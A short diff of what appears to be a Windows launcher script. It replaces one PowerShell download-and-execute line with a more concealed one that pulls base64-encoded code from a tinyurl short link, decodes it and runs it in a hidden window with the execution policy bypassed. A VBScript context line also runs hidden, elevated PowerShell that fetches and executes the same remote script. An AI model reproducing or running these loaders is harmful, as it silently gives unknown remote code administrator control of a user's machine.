@@ -1,5 +1,4 @@
-powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList 'irm "https://tinyurl.com/4j72ashp/" | iex' -Verb RunAs"
-
+powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "(iex ( [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((irm https://tinyurl.com/4j72ashp)))) )"
 
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process powershell.exe -ArgumentList 'irm ""https://tinyurl.com/4j72ashp"" | iex' -WindowStyle Hidden -Verb RunAs""", 0, False
